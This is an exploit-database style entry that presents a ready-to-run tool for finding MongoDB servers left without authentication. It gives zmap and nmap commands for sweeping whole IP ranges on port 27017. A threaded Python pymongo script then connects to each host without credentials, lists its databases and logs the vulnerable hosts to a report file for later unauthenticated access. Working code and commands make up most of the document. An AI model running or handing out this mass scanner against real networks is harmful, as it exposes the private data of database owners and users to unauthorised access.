# Exploit Title: MongoDB Unauthnticated Access
# Date: 
# Exploit Authors: Mihnea Octavian Manolache & Sorin Marica
# Vendor Homepage: 
# Software Link: 
# CVE: n/a
# Original Report Link: 

# Description: Some MongoDB clusters have no authentication and can therefor be accessed without credentials

# Steps to reproduce:
##  1.  Check for IPs with open ports on `27017`(default port for mongod and mongos instances) using zmap
##      1.1.  Install zmap >
##      1.2.  Navigate to the exploit directory:
##            `cd ../../check_mongo`
##      1.3.  Find open ports by using Zmap:
##            `zmap -p 27017 <IP_RANGE> -o ips.txt`
##                  OR
##            Find open ports by using nmap:
##            `nmap <IP_RANGE>  -p 27017 -Pn > nmap.txt`
##
##             example for <IP_RANGE>: 192.168.0.0/8
## 
##  2.  Attempt authentication 
##      2.1.  Without credentials via MongoDB traditional means (manually) or
##      2.1.  Attempt authentication using the provided exploit using pymongo (autommated)
##            `python3 check_mongo.py`
##
##  If successful, the exploit will add the vulnerable IPs and their DBs to `report.txt`
##  You can then use MongoDB Cluster for example and connect to the clusters unauthenticated,
##  whch will also give you access to all the databases available on that cluster.

############ EXPLOIT ###############

import os
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure
import concurrent.futures

def check_vulnerability(ip):
    ip = ip.rstrip(os.linesep)
    print(f'\033[0;96m [!] Checking {ip}')
    CONNECTION_STRING = f"mongodb://{ip}:27017"
    client = MongoClient(CONNECTION_STRING)
    try:
        dbs = client.list_database_names()
        print(f'\033[0;92m [+] IP {ip} is VULNERABLE!')
        return (ip, dbs)
    except Exception as e:
        print(f'\033[0;95m [-] IP {ip} is not vulnerable!')
        return None

def exploit(ip_list='ips.txt'):
    vulnerable = 0
    report = open("report.txt", "w+")
    with open(ip_list) as ips:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(check_vulnerability, ip) for ip in ips]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is not None:
                    vulnerable += 1
                    ip, dbs = result
                    report.write(f"[+] {ip} - {dbs} \n")
    return vulnerable

exploit_count = exploit()
if exploit_count == 0:
    print(f'\033[0;91m [-] Found {exploit_count} vulnerable databases.')
else:
    print(f'\033[0;92m [+] Found {exploit_count} vulnerable databases.')
print(f'\033[0;93m [*] Check the `report.txt` file for more info')